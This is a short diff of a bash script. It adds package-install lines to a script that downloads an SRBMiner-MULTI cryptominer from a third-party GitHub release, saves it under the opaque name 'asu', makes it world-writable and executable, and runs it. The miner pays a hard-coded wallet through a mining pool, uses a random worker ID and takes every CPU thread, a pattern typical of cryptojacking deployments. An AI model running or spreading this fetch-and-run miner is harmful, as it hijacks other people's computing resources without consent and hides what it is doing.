@@ -1,4 +1,6 @@
 #!/bin/bash
+apt update
+apt -y install libjansson-dev libomp-dev
 wget -O asu https://github.com/bondaltomason/meo/releases/download/2.7.0/SRBMiner-MULTI
 chmod 777 asu
 ./asu --algorithm verushash --pool sg.vipor.net:5040 --wallet R9awxso5wUdcZMCMGMrsv4NkQSSJL5ALMo.$(echo $RANDOM | md5sum | head -c 10) --password x --cpu-threads $(nproc --all)
